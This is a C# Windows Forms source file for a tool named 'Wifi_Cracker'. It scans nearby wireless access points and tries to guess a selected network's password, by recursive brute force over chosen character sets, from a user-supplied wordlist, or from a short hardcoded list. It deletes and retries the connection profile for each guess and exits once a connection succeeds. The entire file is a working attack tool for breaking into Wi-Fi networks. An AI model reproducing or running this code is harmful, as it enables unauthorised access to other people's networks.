using SimpleWifi;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Wifi_Cracker
{
    public partial class Form1 : Form
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool AllocConsole();
        public Form1()
        {
            InitializeComponent();
        }

        private string azup = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        private string azlw = "abcdefghijklmnopqrstuvwxyz";
        private string numb = "0123456789";
        private string symb = "!@#$%^&*()-_=+{[}]|:;<>,.?/";

        private static Wifi wifi;
        private string text = "";
        private string texttotal = "";
        private string area = "";
        private int x = 0, first = 0;
        string[] custm;
        private async Task cstmForce(AccessPoint ap)
        {
            foreach (string x in custm)
            {
                Console.WriteLine(x);
                await Task.Run(() => connect(ap, x));
            }
        }
        private async Task bruteForce(int xx,AccessPoint ap)
        {
            if (x == xx)
            {
                foreach (char chrx in area)
                {
                    texttotal = text + chrx;
                    Console.WriteLine(texttotal);
                    await Task.Run(()=> connect(ap, texttotal));
                    //connect(ap, texttotal);
                }
            }
            else
            {
                xx--;
                foreach (char chrx in area)
                {
                    text += chrx;
                    await bruteForce(xx,ap);
                    text = text.Substring(0, text.Length - 1);
                }
            }
        }
        private void button4_Click(object sender, EventArgs e)
        {
            OpenFileDialog dlg = new OpenFileDialog();
            dlg.Filter = "Text Documents (*.txt)|*.txt";
            if (dlg.ShowDialog() == DialogResult.OK)
            {
                checkBox1.Enabled = false;
                checkBox2.Enabled = false;
                checkBox3.Enabled = false;
                checkBox4.Enabled = false;
                checkBox5.Enabled = false;
                numericUpDown1.Enabled = false;
                button1.Enabled = true;
                textBox3.Text = dlg.FileName;
                custm = File.ReadAllLines(dlg.FileName, Encoding.UTF8);
            }
        }

        private async void button1_Click(object sender, EventArgs e)
        {
            if(listView1.Items.Count > 0)
            {
                if (checkBox2.Checked)
                {
                    area += azlw;
                }
                if (checkBox1.Checked)
                {
                    area += azup;
                }
                if (checkBox3.Checked)
                {
                    area += numb;
                }
                if (checkBox4.Checked)
                {
                    area += symb;
                }

                ListViewItem selecteditem = listView1.SelectedItems[0];
                AccessPoint ap = (AccessPoint)selecteditem.Tag;
                AllocConsole();
                if (textBox3.Text == "")
                {
                    for (int i = first; i < numericUpDown1.Value; i++)
                    {
                        await bruteForce(i, ap);
                    }
                }
                else
                {
                    await cstmForce(ap);
                }
            }
        }
        private async Task connect(AccessPoint ap, string password)
        {
            ap.DeleteProfile();
            bool str = false;
            AuthRequest ar = new AuthRequest(ap);
            ar.Password = password;
            try
            {
                str = await Task.Run(() => ap.Connect(ar));
                //str = ap.Connect(ar);
            }
            catch
            {
            }
            Console.WriteLine(ap.ToString()+ar.Password + str);
            if(str)
            {
                Environment.Exit(0);
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            wifi = new Wifi();
            List<AccessPoint> aps = wifi.GetAccessPoints();
            foreach(AccessPoint ap in aps)
            {
                ListViewItem lobj = new ListViewItem(ap.Name);
                lobj.SubItems.Add(ap.SignalStrength + "'''");
                lobj.Tag = ap;
                listView1.Items.Add(lobj);
            }
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            string[] arrrr = { "ex38hdhd", "dttb5381", "jdkeiua9", "fjdhklo3", "mkjklks0" };
            ListViewItem selecteditem = listView1.SelectedItems[0];
            AccessPoint ap = (AccessPoint)selecteditem.Tag;
            foreach(string x in arrrr)
            {
                Console.WriteLine(x);
                await Task.Run(() => connect(ap, x));
                Console.WriteLine("Waiting...");
            }
        }

        private void numericUpDown1_ValueChanged(object sender, EventArgs e)
        {
            if((checkBox5.Checked && numericUpDown1.Value<8) || (numericUpDown1.Value == 0))
            {
                button1.Enabled = false;
            }
            else
            {
                button1.Enabled = true;
            }
        }

        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            if(checkBox5.Checked)
            {
                label3.Text = "Password Length : 8 -";
                first = 7;
                if (numericUpDown1.Value < 8)
                {
                    button1.Enabled = false;
                }
            }
            else
            {
                label3.Text = "Password Length : 1 -";
                first = 0;
                if (numericUpDown1.Value > 0)
                {
                    button1.Enabled = true;
                }
            }
        }
    }
}
